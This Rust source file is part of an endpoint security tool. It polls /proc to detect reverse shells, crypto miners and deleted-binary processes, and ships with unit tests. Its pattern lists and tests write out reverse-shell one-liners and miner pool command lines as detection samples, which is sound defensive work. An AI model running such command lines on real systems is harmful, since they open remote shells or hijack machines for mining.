// ============================================================================
// File: endpoint/process_monitor.rs
// Description: Real-time process behavior monitoring via /proc
// ============================================================================
//! Process Monitor — detects reverse shells, crypto miners, privilege escalation,
//! and suspicious process behavior by polling /proc.

use super::{DetectionCategory, RecommendedAction, ScanResult, Severity};
use parking_lot::RwLock;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Instant;

/// Reverse shell command-line patterns.
const REVERSE_SHELL_PATTERNS: &[&str] = &[
    "bash -i >& /dev/tcp/",
    "bash -i >& /dev/udp/",
    "/bin/sh -i",
    "nc -e /bin/",
    "nc -e /bin/bash",
    "ncat -e /bin/",
    "python -c 'import socket",
    "python3 -c 'import socket",
    "python -c \"import socket",
    "python3 -c \"import socket",
    "perl -e 'use Socket",
    "ruby -rsocket",
    "php -r '$sock=fsockopen",
    "socat exec:",
    "0<&196;exec 196<>/dev/tcp/",
    "exec 5<>/dev/tcp/",
    "import pty;pty.spawn",
    "lua -e \"require('socket\"",
    "openssl s_client -connect",
];

/// Crypto miner command-line patterns.
const MINER_PATTERNS: &[&str] = &[
    "stratum+tcp://",
    "stratum+ssl://",
    "xmrig",
    "minerd",
    "cpuminer",
    "cryptonight",
    "ethminer",
    "nbminer",
    "phoenixminer",
    "t-rex",
    "lolminer",
    "gminer",
    "randomx",
    "kawpow",
    "pool.minergate",
    "pool.minexmr",
    "nicehash",
];

/// Configuration for the process monitor.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessMonitorConfig {
    pub poll_interval_ms: u64,
    pub crypto_cpu_threshold: f64,
    pub crypto_duration_secs: u64,
    pub allowlist_names: Vec<String>,
}

impl Default for ProcessMonitorConfig {
    fn default() -> Self {
        Self {
            poll_interval_ms: 2000,
            crypto_cpu_threshold: 90.0,
            crypto_duration_secs: 60,
            allowlist_names: Vec::new(),
        }
    }
}

/// Tracked state for a process.
struct ProcessInfo {
    pid: u32,
    name: String,
    exe: String,
    cmdline: String,
    ppid: u32,
    cpu_ticks: u64,
    first_seen: Instant,
    high_cpu_since: Option<Instant>,
}

/// Real-time process behavior monitor.
pub struct ProcessMonitor {
    config: ProcessMonitorConfig,
    known_pids: RwLock<HashMap<u32, ProcessInfo>>,
    running: Arc<AtomicBool>,
}

impl ProcessMonitor {
    pub fn new(config: ProcessMonitorConfig) -> Self {
        Self {
            config,
            known_pids: RwLock::new(HashMap::new()),
            running: Arc::new(AtomicBool::new(true)),
        }
    }

    /// Perform a single scan of all processes. Returns detections.
    pub fn scan_once(&self) -> Vec<ScanResult> {
        let mut results = Vec::new();
        let mut current_pids: HashMap<u32, ProcessInfo> = HashMap::new();

        // Read /proc for all PIDs
        let entries = match std::fs::read_dir("/proc") {
            Ok(e) => e,
            Err(_) => return results,
        };

        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();

            // Only numeric directories (PIDs)
            let pid: u32 = match name_str.parse() {
                Ok(p) => p,
                Err(_) => continue,
            };

            // Read process info (graceful — processes can exit at any time)
            let comm = read_proc_file(pid, "comm")
                .unwrap_or_default()
                .trim()
                .to_string();
            let cmdline = read_proc_cmdline(pid).unwrap_or_default();
            let stat = read_proc_file(pid, "stat").unwrap_or_default();
            let exe = std::fs::read_link(format!("/proc/{}/exe", pid))
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_default();

            // Parse ppid and cpu ticks from stat
            let (ppid, cpu_ticks) = parse_stat_fields(&stat);

            let info = ProcessInfo {
                pid,
                name: comm.clone(),
                exe: exe.clone(),
                cmdline: cmdline.clone(),
                ppid,
                cpu_ticks,
                first_seen: Instant::now(),
                high_cpu_since: None,
            };

            // Check if this is a NEW process
            let is_new = !self.known_pids.read().contains_key(&pid);

            if is_new && !cmdline.is_empty() {
                // Check for reverse shell patterns
                let cmdline_lower = cmdline.to_lowercase();
                for pattern in REVERSE_SHELL_PATTERNS {
                    if cmdline_lower.contains(&pattern.to_lowercase()) {
                        results.push(ScanResult::new(
                            "process_monitor",
                            format!("pid:{} ({})", pid, comm),
                            Severity::Critical,
                            DetectionCategory::SuspiciousProcess {
                                pid,
                                name: comm.clone(),
                            },
                            format!(
                                "Reverse shell detected — PID {} ({}) cmdline matches pattern: '{}'",
                                pid, comm, pattern
                            ),
                            0.95,
                            RecommendedAction::KillProcess { pid },
                        ));
                        break;
                    }
                }

                // Check for crypto miner patterns
                for pattern in MINER_PATTERNS {
                    if cmdline_lower.contains(&pattern.to_lowercase()) {
                        results.push(ScanResult::new(
                            "process_monitor",
                            format!("pid:{} ({})", pid, comm),
                            Severity::High,
                            DetectionCategory::SuspiciousProcess {
                                pid,
                                name: comm.clone(),
                            },
                            format!(
                                "Crypto miner detected — PID {} ({}) cmdline matches pattern: '{}'",
                                pid, comm, pattern
                            ),
                            0.85,
                            RecommendedAction::KillProcess { pid },
                        ));
                        break;
                    }
                }
            }

            // Check for deleted executable (common after injection)
            if exe.contains("(deleted)") {
                results.push(ScanResult::new(
                    "process_monitor",
                    format!("pid:{} ({})", pid, comm),
                    Severity::Medium,
                    DetectionCategory::SuspiciousProcess {
                        pid,
                        name: comm.clone(),
                    },
                    format!(
                        "Process running from deleted binary — PID {} ({}) exe: {}",
                        pid, comm, exe
                    ),
                    0.7,
                    RecommendedAction::Alert,
                ));
            }

            current_pids.insert(pid, info);
        }

        // Update known PIDs
        *self.known_pids.write() = current_pids;

        results
    }

    /// Start the process monitor in a background task.
    pub fn start(
        self: Arc<Self>,
        detection_tx: tokio::sync::mpsc::UnboundedSender<ScanResult>,
    ) -> tokio::task::JoinHandle<()> {
        let running = Arc::clone(&self.running);
        let interval_ms = self.config.poll_interval_ms;

        tokio::spawn(async move {
            let mut interval =
                tokio::time::interval(std::time::Duration::from_millis(interval_ms));

            while running.load(Ordering::Relaxed) {
                interval.tick().await;
                let results = self.scan_once();
                for result in results {
                    if detection_tx.send(result).is_err() {
                        return;
                    }
                }
            }
        })
    }

    /// Stop the process monitor.
    pub fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }
}

/// Read a /proc/[pid]/[file] as a string.
fn read_proc_file(pid: u32, file: &str) -> Option<String> {
    std::fs::read_to_string(format!("/proc/{}/{}", pid, file)).ok()
}

/// Read /proc/[pid]/cmdline, replacing null bytes with spaces.
fn read_proc_cmdline(pid: u32) -> Option<String> {
    let data = std::fs::read(format!("/proc/{}/cmdline", pid)).ok()?;
    let s: String = data.iter().map(|&b| if b == 0 { ' ' } else { b as char }).collect();
    Some(s.trim().to_string())
}

/// Parse ppid (field 4) and cpu ticks (utime+stime, fields 14+15) from /proc/[pid]/stat.
fn parse_stat_fields(stat: &str) -> (u32, u64) {
    // stat format: "pid (comm) state ppid ..."
    // comm can contain spaces and parens, so find the LAST ")" to skip it
    let close_paren = match stat.rfind(')') {
        Some(i) => i,
        None => return (0, 0),
    };

    let fields_str = &stat[close_paren + 2..]; // skip ") "
    let fields: Vec<&str> = fields_str.split_whitespace().collect();

    // After the closing paren:
    // field 0 = state, field 1 = ppid, ..., field 11 = utime, field 12 = stime
    let ppid = fields.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
    let utime: u64 = fields.get(11).and_then(|s| s.parse().ok()).unwrap_or(0);
    let stime: u64 = fields.get(12).and_then(|s| s.parse().ok()).unwrap_or(0);

    (ppid, utime + stime)
}

/// Check if a command line matches any reverse shell pattern.
pub fn matches_reverse_shell(cmdline: &str) -> bool {
    let lower = cmdline.to_lowercase();
    REVERSE_SHELL_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_lowercase()))
}

/// Check if a command line matches any miner pattern.
pub fn matches_miner(cmdline: &str) -> bool {
    let lower = cmdline.to_lowercase();
    MINER_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_lowercase()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn reverse_shell_bash_tcp() {
        assert!(matches_reverse_shell("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"));
    }

    #[test]
    fn reverse_shell_nc() {
        assert!(matches_reverse_shell("nc -e /bin/bash 10.0.0.1 4444"));
    }

    #[test]
    fn reverse_shell_python() {
        assert!(matches_reverse_shell(
            "python3 -c 'import socket,subprocess,os;s=socket.socket('"
        ));
    }

    #[test]
    fn reverse_shell_perl() {
        assert!(matches_reverse_shell("perl -e 'use Socket;$i=\"10.0.0.1\"'"));
    }

    #[test]
    fn clean_cmdline_passes() {
        assert!(!matches_reverse_shell("vim /etc/nginx/nginx.conf"));
        assert!(!matches_reverse_shell("cargo build --release"));
        assert!(!matches_reverse_shell("node server.js"));
    }

    #[test]
    fn miner_xmrig() {
        assert!(matches_miner("./xmrig --url stratum+tcp://pool.minexmr.com:4444"));
    }

    #[test]
    fn miner_stratum() {
        assert!(matches_miner("miner --pool stratum+ssl://us-east.stratum.slushpool.com"));
    }

    #[test]
    fn normal_process_not_miner() {
        assert!(!matches_miner("python3 train_model.py --epochs 100"));
        assert!(!matches_miner("gcc -O2 main.c -o main"));
    }

    #[test]
    fn config_defaults() {
        let config = ProcessMonitorConfig::default();
        assert_eq!(config.poll_interval_ms, 2000);
        assert_eq!(config.crypto_cpu_threshold, 90.0);
        assert_eq!(config.crypto_duration_secs, 60);
    }

    #[test]
    fn parse_stat_valid() {
        let stat = "1234 (my process) S 1 1234 1234 0 -1 4194304 500 0 0 0 100 50 0 0 20 0 1 0 100 1000000 100 18446744073709551615 0 0 0 0 0 0 0 0 0";
        let (ppid, ticks) = parse_stat_fields(stat);
        assert_eq!(ppid, 1);
        assert_eq!(ticks, 150); // utime(100) + stime(50)
    }

    #[test]
    fn parse_stat_with_parens_in_name() {
        let stat = "5678 (my (weird) proc) S 42 5678 5678 0 -1 0 0 0 0 0 200 30 0 0 20 0 1 0 0 0 0 0 0 0 0 0 0 0 0";
        let (ppid, ticks) = parse_stat_fields(stat);
        assert_eq!(ppid, 42);
        assert_eq!(ticks, 230); // 200 + 30
    }

    #[test]
    fn deleted_exe_pattern() {
        let exe = "/usr/bin/evil (deleted)";
        assert!(exe.contains("(deleted)"));
    }

    #[test]
    fn scan_once_runs_without_crash() {
        let monitor = ProcessMonitor::new(ProcessMonitorConfig::default());
        let results = monitor.scan_once();
        // Should not crash — results may be empty or have findings
        let _ = results;
    }
}